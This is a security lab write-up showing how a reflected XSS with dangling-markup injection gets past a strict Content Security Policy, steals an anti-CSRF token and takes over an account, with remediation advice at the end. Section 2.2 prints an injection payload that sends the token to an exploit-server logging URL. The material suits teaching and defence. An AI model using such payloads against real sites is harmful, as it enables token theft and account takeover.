# Lab: CSP Bypass via Reflected XSS & Dangling Markup

**Severity:** High 

**Vulnerability Type:** Reflected Cross-Site Scripting (XSS)/Content Security Policy (CSP) Bypass

**Target:** Web Security Academy - User Account Functionality 

##### 1. Executive Summary 

During the assessment of the "My Account" functionality, a Reflected XSS 
vulnerability was identified that allows for the bypass of strict Content 
Security Policy (CSP) protections. 

Although the application implements a strict CSP that blocks standard XSS (
inline scripts and external script loading), it is vulnerable to Dangling 
Markup Injection. An attacker can inject partial HTML tags to "swallow" 
sensitive data on the page-specifically the Anti-CSRF token-and exfiltrate it
to an external server. This stolen token can then be used to perform 
unauthorised actions, such as changing the victim's email address leading to 
full account takeover. 

##### 2. Technical Walkthrough 

2.1 Vulnerability Analysis 

The application reflects the `email` query parameter into the `value` attribute
of an HTML input field without proper sanitisation.

<img width="1199" height="791" alt="d2" src="https://github.com/user-attachments/assets/2eb9308d-1258-41ec-9b35-9fdd7dc2043d" />

While this creates a context for XSS< the application's strict CSP prevents
the execution of JavaScript. Therefore, a standard payload like `<script>
alert(1)</script>` is blocked by the browser. 

2.2 Exploitation Phase 1: Exfiltrating the CSRF Token

To bypass the CSP, we employed a "Dangling Markup" attack. The goal is to 
inject HTML that breaks the current context and captures the subsequent data
in the DOM (the CSRF token) by treating it as part of an HTML attribute or 
form data.

The Attack Logic:

1. Break Context: Use `">` to close the current input tag and `</form>` to
close the existing form.

2. Inject Malicious Form: Open a new `<form>` tag with its `action` pointing
to the attacker's server.

3. Capture Token: Because the legitimate CSRF input field is located after
the injection point in the HTML source, it physically falls "inside" our
new malicious form.

4. Exfiltrate: when this new form is submitted, the browser sends the captured
CSRF token to the attacker.

Payload used:

```
"><table background='//exploit-server...
"></form><form action="https://exploit-server.net/log" method="GET"><input type="submit" value="Click me">
```

<img width="1185" height="743" alt="d5" src="https://github.com/user-attachments/assets/877fd001-e460-41e0-8832-69fbfd400d69" />

Upon the victim triggering the payload (e.g., clicking the injected button),
the browser sends a GET request to the attacker's logger, carrying the 
victim's valid CSRF token. 

<img width="1186" height="732" alt="d6" src="https://github.com/user-attachments/assets/b04fb853-6a57-4730-a622-c9b86a6dd5bd" />

2.3 Exploitation Phase 2: Account Takeover (CSRF)

With the stolen CSRF token, the attacker can now construct a valid Cross-Site
Request Forgery (CSRF) attack to change the victim's email address. Since we
possess the valid token, the application's Anti-CSRF protection is rendered
useless. 

A standard HTML form was created on the exploit server to auto-submit the "
Change Email" request using the stolen token. 

<img width="1440" height="759" alt="d7" src="https://github.com/user-attachments/assets/f6728de0-751d-4a78-baa3-35fc80c37c0d" />

<img width="1186" height="746" alt="d8" src="https://github.com/user-attachments/assets/8205389d-d4d6-46b0-926c-2bd3fbe57dfc" />

##### 3. Impact Analysis 

The impact is rated as High.

- Defense Evasion: Demonstrates that CSP alone is not sufficient to prevent
data theft if HTML injection is possible.

- Account Takeover: The vulnerability allows an attacker to bypass
authentication controls (CSRF tokens) and modify critical account details
(email), leading to complete account compromise.

##### 4. Remediation

To mitigate this vulnerability:

1. Context-Aware Encoding: Strictly encode all user-supplied data before
rendering it in the HTML. Specifically, encode characters such as `"`, `<`,
`>`, `'`, and `/`.

2. Prevent Injection: Ensure user input inside attributes is always quoted
and that the input itself cannot break out of those quotes.

3. CSP Refinement: While CSP helps, it should be treated as a defense-in-
depth layer, not a primary replacement for input validation and output
encoding. 
